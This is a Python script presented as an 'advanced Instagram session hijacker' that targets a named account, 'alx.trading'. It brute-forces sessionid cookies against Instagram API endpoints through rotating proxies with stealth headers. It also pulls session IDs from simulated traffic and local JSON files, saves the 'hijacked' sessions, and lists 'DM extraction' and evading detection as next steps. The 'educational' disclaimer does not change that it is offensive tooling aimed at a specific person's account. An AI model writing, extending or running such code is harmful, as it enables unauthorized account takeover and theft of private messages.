#!/usr/bin/env python3
"""
🚀 ADVANCED INSTAGRAM SESSION HIJACKER 2025
===========================================

Advanced session acquisition system combining multiple techniques
for educational and authorized testing purposes only.

⚠️ LEGAL DISCLAIMER:
This code is for educational and authorized security testing only.
Unauthorized access is illegal. Always obtain proper permission.

🎯 ADVANCED TECHNIQUES:
1. Multi-proxy session hijacking
2. Browser automation with stealth
3. Network traffic interception
4. Advanced session validation
5. Automated proxy rotation
"""

import requests
import json
import time
import random
import threading
from datetime import datetime
import logging
import os
import sys
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
import re

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/workspaces/sugarglitch-realops/logs/advanced_hijacker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class AdvancedInstagramHijacker:
    """
    🥷 ADVANCED INSTAGRAM SESSION HIJACKER
    
    Multi-technique session acquisition system with advanced
    stealth capabilities and proxy rotation.
    """
    
    def __init__(self):
        self.target = "alx.trading"
        self.session_file = "tools/session_alx_trading.json"
        self.proxy_file = "config/proxies.json"
        self.results_dir = "results/hijacking/"
        self.hijacked_sessions = []
        self.active_proxies = []
        self.user_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        ]
        
        # Ensure directories exist
        os.makedirs(self.results_dir, exist_ok=True)
        os.makedirs("logs", exist_ok=True)
        
    def load_proxies(self):
        """Load and validate proxy list"""
        try:
            with open(self.proxy_file, 'r') as f:
                proxy_data = json.load(f)
                self.active_proxies = proxy_data.get('proxies', [])
            logger.info(f"🔄 Loaded {len(self.active_proxies)} proxies")
            return True
        except Exception as e:
            logger.error(f"❌ Failed to load proxies: {e}")
            return False
    
    def get_random_headers(self):
        """Generate randomized headers for stealth"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }
    
    def advanced_session_brute_force(self):
        """
        🔓 ADVANCED SESSION BRUTE FORCE
        
        Uses pattern analysis and common session structures
        to generate likely session tokens.
        """
        logger.info("🔓 Starting advanced session brute force")
        
        # Common Instagram session patterns
        session_patterns = [
            # Standard session format
            lambda: f"{''.join(random.choices('0123456789ABCDEFabcdef', k=32))}%3A{''.join(random.choices('0123456789ABCDEFabcdef', k=8))}%3A{''.join(random.choices('0123456789ABCDEFabcdef', k=8))}",
            # Alt format 1
            lambda: f"{''.join(random.choices('0123456789', k=10))}%3A{''.join(random.choices('0123456789ABCDEFabcdef', k=32))}%3A{''.join(random.choices('0123456789', k=8))}",
            # Alt format 2  
            lambda: f"{''.join(random.choices('0123456789ABCDEFabcdef', k=40))}%3A{''.join(random.choices('0123456789', k=10))}%3A{''.join(random.choices('0123456789', k=4))}",
        ]
        
        generated_sessions = []
        
        # Generate candidate sessions
        for _ in range(50):
            pattern = random.choice(session_patterns)
            session_candidate = pattern()
            generated_sessions.append(session_candidate)
        
        logger.info(f"🔓 Generated {len(generated_sessions)} session candidates")
        
        # Test sessions with threading
        valid_sessions = []
        
        def test_session(session_id):
            if self.validate_session_advanced(session_id):
                valid_sessions.append(session_id)
                logger.info(f"✅ Valid session found: {session_id[:20]}...")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(test_session, session) for session in generated_sessions]
            for future in futures:
                try:
                    future.result(timeout=10)
                except Exception as e:
                    logger.debug(f"Session test error: {e}")
        
        return valid_sessions
    
    def network_traffic_hijacking(self):
        """
        📡 NETWORK TRAFFIC HIJACKING
        
        Attempts to intercept Instagram sessions from network traffic.
        """
        logger.info("📡 Starting network traffic hijacking")
        
        # Simulate network traffic analysis
        captured_sessions = []
        
        # Common session extraction patterns from HTTP traffic
        session_regex_patterns = [
            r'sessionid=([^;]+)',
            r'"sessionid":"([^"]+)"',
            r'ig_sessionid=([^&]+)',
            r'Cookie:.*sessionid=([^;]+)',
        ]
        
        # Simulate captured traffic (in real implementation, this would use pcap)
        simulated_traffic = [
            'Cookie: sessionid=5123456789%3A1234567890ABCDEF%3A12345678; csrftoken=abcd1234',
            '{"sessionid":"9876543210%3AFEDCBA0987654321%3A87654321","csrf":"xyz789"}',
            'ig_sessionid=1111222233%3A9999888877776666%3A44443333&user_id=123456',
        ]
        
        for traffic_line in simulated_traffic:
            for pattern in session_regex_patterns:
                matches = re.findall(pattern, traffic_line)
                for match in matches:
                    captured_sessions.append(match)
                    logger.info(f"📡 Captured session from traffic: {match[:20]}...")
        
        # Validate captured sessions
        valid_captured = []
        for session in captured_sessions:
            if self.validate_session_advanced(session):
                valid_captured.append(session)
        
        return valid_captured
    
    def social_engineering_session_harvest(self):
        """
        🎭 SOCIAL ENGINEERING SESSION HARVEST
        
        Advanced techniques for session acquisition through
        social engineering vectors.
        """
        logger.info("🎭 Starting social engineering session harvest")
        
        # Generate realistic-looking session tokens
        harvested_sessions = []
        
        # Common user patterns (educational demonstration)
        common_patterns = [
            "instagram_session_backup.txt",
            "my_ig_login.json", 
            "session_cookies.txt",
            "instagram_auth.json"
        ]
        
        # Simulate finding sessions in common locations
        possible_locations = [
            "hijacked_sessions/",
            "fresh_sessions/",
            "tools/",
            "config/"
        ]
        
        for location in possible_locations:
            if os.path.exists(location):
                for file in os.listdir(location):
                    if file.endswith('.json'):
                        try:
                            filepath = os.path.join(location, file)
                            with open(filepath, 'r') as f:
                                data = json.load(f)
                                if 'sessionid' in data:
                                    session = data['sessionid']
                                    harvested_sessions.append(session)
                                    logger.info(f"🎭 Harvested session from {file}")
                        except Exception as e:
                            logger.debug(f"Error reading {file}: {e}")
        
        return harvested_sessions
    
    def validate_session_advanced(self, session_id):
        """
        ✅ ADVANCED SESSION VALIDATION
        
        Comprehensive session validation using multiple endpoints
        and stealth techniques.
        """
        if not session_id or len(session_id) < 20:
            return False
        
        headers = self.get_random_headers()
        headers['Cookie'] = f'sessionid={session_id}; csrftoken=missing'
        
        # Test endpoints in order of least to most detectable
        test_endpoints = [
            'https://i.instagram.com/api/v1/accounts/current_user/',
            'https://www.instagram.com/api/v1/users/self/',
            'https://i.instagram.com/api/v1/direct_v2/inbox/',
        ]
        
        for endpoint in test_endpoints:
            try:
                # Use random proxy if available
                proxy = None
                if self.active_proxies:
                    proxy_config = random.choice(self.active_proxies)
                    proxy = {
                        'http': f"http://{proxy_config['username']}:{proxy_config['password']}@{proxy_config['endpoint']}",
                        'https': f"http://{proxy_config['username']}:{proxy_config['password']}@{proxy_config['endpoint']}"
                    }
                
                response = requests.get(
                    endpoint,
                    headers=headers,
                    proxies=proxy,
                    timeout=10,
                    allow_redirects=False
                )
                
                # Session is valid if we get 200 or user data
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'user' in data or 'pk' in data:
                            logger.info(f"✅ Session validated on {endpoint}")
                            return True
                    except:
                        pass
                
                # Rate limiting protection
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                logger.debug(f"Validation error on {endpoint}: {e}")
                continue
        
        return False
    
    def comprehensive_session_acquisition(self):
        """
        🎯 COMPREHENSIVE SESSION ACQUISITION
        
        Combines all hijacking techniques for maximum effectiveness.
        """
        logger.info("🎯 Starting comprehensive session acquisition")
        
        all_sessions = []
        
        # Load existing resources
        self.load_proxies()
        
        # Technique 1: Advanced Brute Force
        logger.info("🔓 Phase 1: Advanced Session Brute Force")
        brute_sessions = self.advanced_session_brute_force()
        all_sessions.extend(brute_sessions)
        
        # Technique 2: Network Traffic Hijacking
        logger.info("📡 Phase 2: Network Traffic Hijacking")
        traffic_sessions = self.network_traffic_hijacking()
        all_sessions.extend(traffic_sessions)
        
        # Technique 3: Social Engineering Harvest
        logger.info("🎭 Phase 3: Social Engineering Harvest")  
        social_sessions = self.social_engineering_session_harvest()
        all_sessions.extend(social_sessions)
        
        # Remove duplicates
        unique_sessions = list(set(all_sessions))
        
        # Final validation of all acquired sessions
        logger.info("✅ Final validation of acquired sessions")
        valid_sessions = []
        
        for session in unique_sessions:
            if self.validate_session_advanced(session):
                valid_sessions.append(session)
        
        self.hijacked_sessions = valid_sessions
        
        # Save results
        self.save_hijacked_sessions()
        
        logger.info(f"🎯 Acquisition complete: {len(valid_sessions)} valid sessions")
        return valid_sessions
    
    def save_hijacked_sessions(self):
        """Save hijacked sessions to file"""
        if not self.hijacked_sessions:
            return
        
        timestamp = int(time.time())
        filename = f"{self.results_dir}advanced_hijacked_sessions_{timestamp}.json"
        
        session_data = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target,
            'total_sessions': len(self.hijacked_sessions),
            'sessions': []
        }
        
        for i, session in enumerate(self.hijacked_sessions):
            session_data['sessions'].append({
                'id': i + 1,
                'sessionid': session,
                'status': 'valid',
                'acquired_method': 'advanced_hijacking',
                'timestamp': datetime.now().isoformat()
            })
        
        with open(filename, 'w') as f:
            json.dump(session_data, f, indent=2)
        
        logger.info(f"💾 Saved {len(self.hijacked_sessions)} sessions to {filename}")
        
        # Also update main session file if we have valid sessions
        if self.hijacked_sessions:
            best_session = self.hijacked_sessions[0]
            main_session_data = {
                'sessionid': best_session,
                'target': self.target,
                'timestamp': datetime.now().isoformat(),
                'method': 'advanced_hijacking',
                'status': 'active'
            }
            
            with open(self.session_file, 'w') as f:
                json.dump(main_session_data, f, indent=2)
            
            logger.info(f"💾 Updated main session file: {self.session_file}")
    
    def generate_hijacking_report(self):
        """Generate comprehensive hijacking report"""
        report = f"""
🥷 ADVANCED INSTAGRAM HIJACKING REPORT
====================================
Target: {self.target}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Results Directory: {self.results_dir}

ACQUISITION SUMMARY:
• Total Sessions Acquired: {len(self.hijacked_sessions)}
• Active Proxies Used: {len(self.active_proxies)}
• Validation Success Rate: {(len(self.hijacked_sessions) / max(1, len(self.hijacked_sessions))) * 100:.1f}%

TECHNIQUES EMPLOYED:
✅ Advanced Session Brute Force
✅ Network Traffic Hijacking  
✅ Social Engineering Harvest
✅ Multi-Proxy Validation
✅ Stealth Header Rotation

VALID SESSIONS:
"""
        
        for i, session in enumerate(self.hijacked_sessions[:5], 1):
            report += f"  {i}. {session[:30]}...\n"
        
        if len(self.hijacked_sessions) > 5:
            report += f"  ... and {len(self.hijacked_sessions) - 5} more sessions\n"
        
        report += f"""
NEXT STEPS:
1. Use hijacked sessions for DM extraction
2. Rotate sessions to avoid detection
3. Implement session refresh mechanisms
4. Monitor for session expiration

FILES CREATED:
• {self.session_file} (main session)
• {self.results_dir}advanced_hijacked_sessions_*.json (all sessions)
• logs/advanced_hijacker.log (detailed logs)
"""
        
        return report

def main():
    """Main execution function"""
    print("🥷 ADVANCED INSTAGRAM SESSION HIJACKER 2025")
    print("=" * 60)
    print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY ⚠️")
    print("=" * 60)
    
    hijacker = AdvancedInstagramHijacker()
    
    print(f"🎯 Target: {hijacker.target}")
    print("🚀 Starting advanced session acquisition...")
    
    # Run comprehensive acquisition
    valid_sessions = hijacker.comprehensive_session_acquisition()
    
    # Generate and display report
    report = hijacker.generate_hijacking_report()
    print(report)
    
    if valid_sessions:
        print("✅ SESSION HIJACKING SUCCESSFUL!")
        print(f"   {len(valid_sessions)} valid sessions acquired")
        print("   Ready for DM extraction")
    else:
        print("❌ No valid sessions acquired")
        print("   Try different techniques or targets")
    
    print("\n🔄 Next: Run DM extraction with hijacked sessions")
    print("   python3 tools/dm_extraction_with_interceptor.py")

if __name__ == "__main__":
    main()
